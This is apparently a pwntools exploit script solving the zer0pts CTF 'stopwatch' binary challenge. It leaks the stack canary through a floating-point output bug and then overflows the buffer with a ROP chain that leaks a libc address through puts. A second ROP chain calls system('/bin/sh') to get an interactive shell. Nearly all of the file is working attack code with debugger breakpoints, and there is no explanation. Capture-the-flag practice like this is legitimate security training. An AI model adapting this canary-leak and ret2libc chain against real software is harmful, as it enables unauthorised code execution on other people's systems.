from pwn import *
from decimal import *
import struct
'''
root@kali:/home/kali/Desktop/stopwatch# checksec chall 
[*] '/home/kali/Desktop/stopwatch/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

No PIE -> ROP ALERT!

'''

def double_to_hex(val):
    return int.from_bytes(struct.pack("d", val), "little")

local_bin = "./chall"

#libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")


elf = ELF(local_bin)
rop = ROP(elf)
start = elf.symbols['_start']
print("start = ", hex(start))
PRINT_PLT = elf.plt['printf']
print("PRINT_PLT = ", hex(PRINT_PLT))

PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
FUNC_GOT = elf.got['puts']
print("FUNC_GOT = ", hex(FUNC_GOT))


#p = remote("pwn.ctf.zer0pts.com", 9002)
#p = process(local_bin)

p = gdb.debug(local_bin, '''
	#break _start
  #break *play_game+317
  #break *play_game+60
  #break ask_name
  break *ask_again+122
  #break ask_number
  #break *play_game+30
  #continue
  #''')

#pwn.ctf.zer0pts.com 9011    
#p = remote("pwn.ctf.zer0pts.com",9011) 

# define double_to_hex (or float_to_hex)
def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])

def add_name(name):
  output = p.recvuntil("What is your name?")
  p.sendline(name)

payload = b'a'
add_name(payload)

p.sendlineafter("> ", b'16')

p.sendlineafter("> ", b'-')

output = p.recvuntil('close to ')
print(output)

canary = p.recvuntil('.000000')
print('canary = ', canary)
if (canary == b'0.000000'):
  print("bad luck")
  exit(1)
if (canary == b'-0.000000'):
  print("bad luck")
  exit(1)

hex_canary = canary[0:-7]
print('hex canary = ', hex_canary)
print(type(hex_canary))
#print(double_to_hex(hex_canary))
hex_canary = (float(hex_canary))
hex_canary = double_to_hex(hex_canary)
print('hex canary = ', hex_canary)


p.sendlineafter("stop the timer", b"\x0a")

#main = 0x400760
#try again overflow the buffer
payload = b'a'*24
payload += p64(int(hex_canary,0), endian='little')
payload += b'a'*8
payload += p64(POP_RDI, endian='little')
payload += p64(0x601ff0)
payload += p64(PUTS_PLT, endian='little')
payload += p64(start, endian='little')

p.sendlineafter('(Y/n)', payload)



#system restarted!
print("[+] System restarted, find some way to leak libc")

#p.sendlineafter("name", b'a')
libc_base = p.recvuntil('\n')
print("leak = ", libc_base)
leak = libc_base[1:-1]
print("leak_raw = ", leak)
leak_dec = int.from_bytes(leak,"little")
print("leak_dec = ", (leak_dec))
print("leak = ", hex(leak_dec))

libc_base = leak_dec - libc.sym["__libc_start_main"]
#libc_base = leak_dec - 0x26c20 #for /usr/lib/x86_64-linux-gnu/libc-2.31.so
#libc_base = leak_dec - 0x21b10 #server libc
print("libc_base = ", hex(libc_base))

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

#print("BINSH = ", BINSH)
#print("SYSTEM = ", SYSTEM)
#print("EXIT = ", EXIT)

output = p.recv()
print(output)

p.sendline(b'a')

output = p.recv()
print(output)
p.sendline(b'10')

output = p.recv()
print(output)
p.sendline(b"1")

output = p.recv()
print(output)
p.sendline(b"\x0a")

rop_ret = 0x00400e94

payload = b'a'*24
payload += p64(int(hex_canary,0), endian='little')
payload += b'a'*8
payload += p64(rop_ret)
payload += p64(POP_RDI, endian='little')
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)

output = p.recv()
print(output)
p.sendline(payload)


p.interactive()